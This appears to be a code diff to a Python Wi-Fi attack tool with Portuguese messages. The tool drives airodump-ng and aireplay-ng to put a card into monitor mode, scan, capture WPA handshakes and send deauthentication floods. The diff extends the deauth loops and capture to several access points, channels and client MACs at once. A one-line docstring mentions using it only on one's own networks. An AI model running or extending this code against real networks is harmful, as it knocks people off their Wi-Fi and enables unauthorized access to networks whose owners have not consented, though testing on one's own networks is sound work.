@@ -59,9 +59,11 @@ def _radio_present(iface):
 
 def _set_monitor(iface):
     _sh(f"ip link set {iface} down")
-    _sh(f"iw dev {iface} set type monitor control")
+    _sh(f"iw dev {iface} set type monitor")
     _sh(f"ip link set {iface} up")
     time.sleep(1.5)
+    info = _sh(f"iw dev {iface} info")
+    return "type monitor" in (info.stdout or "")
 
 
 def _set_managed(iface):
@@ -121,7 +123,8 @@ def scan(seconds=12, iface=None, _retry=True):
             os.remove(f)
         except OSError:
             pass
-    _set_monitor(iface)
+    if not _set_monitor(iface):
+        return {"ok": False, "error": f"{iface} nao entrou em monitor mode"}
     try:
         _sh(
             f"timeout {seconds} airodump-ng {iface} --band bg "
@@ -307,7 +310,8 @@ def recon(essid, bssids, channels, iface=None):
             os.remove(f)
         except OSError:
             pass
-    _set_monitor(iface)
+    if not _set_monitor(iface):
+        return {"ok": False, "error": f"{iface} nao entrou em monitor mode"}
     try:
         _sh(
             f"timeout 12 airodump-ng {iface} -c {','.join(chans)} "
@@ -408,18 +412,24 @@ def capture_start(bssids, channels, iface=None, mode="ativo", essid=None, client
         return {"ok": False, "error": "nenhum BSSID alvo"}
     bssid = bssids[0]
     ch = str(channels[0]) if channels else "1"
+    multi = len(bssids) > 1 or len(channels) > 1
     for f in glob.glob(f"{WORK}/cap-*"):
         try:
             os.remove(f)
         except OSError:
             pass
     _cleanup_iface(iface)
-    _set_monitor(iface)
-    _sh(f"iw dev {iface} set channel {ch} HT20", timeout=8)
+    if not _set_monitor(iface):
+        return {"ok": False, "error": f"{iface} nao entrou em monitor mode"}
+    if not multi:
+        _sh(f"iw dev {iface} set channel {ch} HT20", timeout=8)
     _last_hs.update(ts=0, n=0)
+    airo_args = ["airodump-ng", "-w", f"{WORK}/cap", "--output-format", "pcap"]
+    if not multi:
+        airo_args += ["-c", ch, "--bssid", bssid]
+    airo_args.append(iface)
     airo = subprocess.Popen(
-        ["airodump-ng", "-c", ch, "--bssid", bssid, "-w", f"{WORK}/cap",
-         "--output-format", "pcap", iface],
+        airo_args,
         stdout=open(f"{WORK}/airo.log", "w"), stderr=subprocess.STDOUT,
         preexec_fn=os.setsid,
     )
@@ -429,17 +439,19 @@ def capture_start(bssids, channels, iface=None, mode="ativo", essid=None, client
         dlog = f"{WORK}/deauth.log"
         if clients_macs:
             cmds = []
-            for cm in clients_macs:
-                cmds.append(f"aireplay-ng --deauth 8 -a {bssid} -c {cm} {iface} >>{dlog} 2>&1")
+            for b in bssids:
+                for cm in clients_macs:
+                    cmds.append(f"aireplay-ng --deauth 8 -a {b} -c {cm} {iface} >>{dlog} 2>&1")
             loop = "; ".join(cmds)
             deauth_proc = subprocess.Popen(
                 ["bash", "-c", f"sleep 3; for i in $(seq 1 10); do {loop}; sleep 6; done"],
                 preexec_fn=os.setsid,
             )
         else:
+            cmds = [f"aireplay-ng --deauth 5 -a {b} {iface} >>{dlog} 2>&1" for b in bssids]
+            loop = "; ".join(cmds)
             deauth_proc = subprocess.Popen(
-                ["bash", "-c",
-                 f"sleep 3; aireplay-ng --deauth 5 -a {bssid} {iface} >>{dlog} 2>&1"],
+                ["bash", "-c", f"sleep 3; {loop}"],
                 preexec_fn=os.setsid,
             )
     _capture.update({"proc": airo, "deauth": deauth_proc, "started": time.time(),
@@ -448,7 +460,6 @@ def capture_start(bssids, channels, iface=None, mode="ativo", essid=None, client
     return {"ok": True, "msg": "captura iniciada", "iface": iface, "modo": mode,
             "alvo": bssid, "canal": ch, "deauth_direcionado": bool(clients_macs)}
 
-
 def deauth(bssid, channel, iface=None, seconds=10):
     """Derruba os clientes de um AP (forca reconexao). So em redes suas."""
     iface = _pick(iface)
@@ -456,7 +467,8 @@ def deauth(bssid, channel, iface=None, seconds=10):
         return {"ok": False, "error": f"interface {iface} ausente."}
     if _capture["proc"] and _capture["proc"].poll() is None:
         return {"ok": False, "error": "pare a captura antes (mesma placa)"}
-    _set_monitor(iface)
+    if not _set_monitor(iface):
+        return {"ok": False, "error": f"{iface} nao entrou em monitor mode"}
     try:
         if channel:
             _sh(f"iw dev {iface} set channel {channel} HT20", timeout=8)
